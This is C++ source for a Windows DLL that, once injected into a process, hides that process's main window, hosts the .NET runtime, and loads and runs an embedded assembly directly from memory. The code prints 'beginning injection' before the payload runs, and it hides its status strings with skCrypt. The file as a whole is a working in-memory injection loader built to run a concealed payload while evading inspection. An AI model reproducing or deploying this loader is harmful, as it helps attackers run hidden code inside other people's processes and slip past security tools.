#include "pch.h"

#include <iostream>
#include <fstream>
#include <metahost.h>
#include <mscoree.h>
#include <random>

#include "skCrypt.h"
#include "Data.h"

#pragma comment(lib, "mscoree.lib")

#import "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorlib.tlb" raw_interfaces_only			\
    	high_property_prefixes("_get","_put","_putref")		\
    	rename("ReportEvent", "InteropServices_ReportEvent")	\
	rename("or", "InteropServices_or")
using namespace mscorlib;

HWND hWnd;

struct handle_data {
    unsigned long process_id;
    HWND window_handle;
};

BOOL is_main_window(HWND handle)
{
    return GetWindow(handle, GW_OWNER) == (HWND)0 && IsWindowVisible(handle);
}

BOOL CALLBACK enum_windows_callback(HWND handle, LPARAM lparam) {
    auto& data = *reinterpret_cast<handle_data*>(lparam);

    unsigned long process_id = 0;
    GetWindowThreadProcessId(handle, &process_id);

    if (data.process_id != process_id || !is_main_window(handle)) {
        return TRUE;
    }
    data.window_handle = handle;
    return FALSE;
}


HWND findMain() {
    handle_data data{};

    data.process_id = GetCurrentProcessId();
    data.window_handle = nullptr;
    EnumWindows(enum_windows_callback, reinterpret_cast<LPARAM>(&data));

    return data.window_handle;
}

void coolMessage(const char* message) {
    std::default_random_engine generator;
    std::uniform_int_distribution<int> distribution(25, 200);
    int delay = distribution(generator);

    Sleep(delay);

    printf(message);
}

void Main() {
    hWnd = findMain();

    ShowWindow(hWnd, SW_HIDE);

    AllocConsole();
    FILE* f;
    freopen_s(&f, "CONIN$", "r", stdin);
    freopen_s(&f, "CONOUT$", "w", stderr);
    freopen_s(&f, "CONOUT$", "w", stdout);

    HWND console = GetConsoleWindow();
    RECT r;
    GetWindowRect(console, &r);

    MoveWindow(console, r.left, r.top, 400, 300, TRUE);

    coolMessage(skCrypt("[+] native stub loaded\n"));

    unsigned char* assembly = rawData;

    coolMessage(skCrypt("[+] loading clr runtime\n"));

    HRESULT hr;

    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* ppRuntime = NULL;
    ICorRuntimeHost* pCorRuntimeHost = NULL;

    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));

    coolMessage(skCrypt("[+] clr instance created\n"));

    hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&ppRuntime));

    if (FAILED(hr)) {
        printf(skCrypt("[-] runtime could not be found\n"));
        return;
    }

    hr = ppRuntime->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&pCorRuntimeHost));

    if (FAILED(hr)) {
        printf(skCrypt("[-] interface pointer could not be established\n"));
        return;
    }

    hr = pCorRuntimeHost->Start();

    if (FAILED(hr)) {
        printf(skCrypt("[-] failed to start runtime\n"));
        return;
    }

    IUnknownPtr spAppDomainThunk = NULL;
    _AppDomainPtr spDefaultAppDomain = NULL;

    hr = pCorRuntimeHost->GetDefaultDomain(&spAppDomainThunk);

    if (FAILED(hr)) {
        printf(skCrypt("[-] failed to get default domain\n"));
        return;
    }

    coolMessage(skCrypt("[+] runtime loaded\n"));

    hr = spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain));

    if (FAILED(hr)) {
        printf(skCrypt("[-] failed to query interface\n"));
    }

    int length = 478720;

    SAFEARRAYBOUND bounds[1];
    bounds[0].cElements = length;
    bounds[0].lLbound = 0;

    SAFEARRAY* arr = SafeArrayCreate(VT_UI1, 1, bounds);
    SafeArrayLock(arr);
    memcpy(arr->pvData, assembly, length);
    SafeArrayUnlock(arr);

    _AssemblyPtr spAssembly = NULL;
    hr = spDefaultAppDomain->Load_3(arr, &spAssembly);

    if (FAILED(hr)) {
        printf(skCrypt("[-] failed to load assembly"));
        return;
    }

    coolMessage("[+] assembly loaded\n");
    
    _MethodInfoPtr pMethodInfo = NULL;

    hr = spAssembly->get_EntryPoint(&pMethodInfo);

    if (FAILED(hr)) {
        printf(skCrypt("[-] failed to find entry point"));
        return;
    }

    coolMessage(skCrypt("[+] found entry point\n"));

    VARIANT retVal;
    ZeroMemory(&retVal, sizeof(VARIANT));

    VARIANT obj;
    ZeroMemory(&obj, sizeof(VARIANT));
    obj.vt = VT_NULL;

    printf(skCrypt("\nbeginning injection..."));
    Sleep(1000);

    hr = pMethodInfo->Invoke_3(obj, NULL, &retVal);

    if (FAILED(hr)) {
        ShowWindow(GetConsoleWindow(), SW_SHOW);
        printf(skCrypt("\n[-] failed to invoke entry point\n"));
        return;
    }

    printf(skCrypt("[+] cleaning up\n"));

    pCorRuntimeHost->Release();

    exit(0);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Main, 0, 0, 0);
    }
    return TRUE;
}

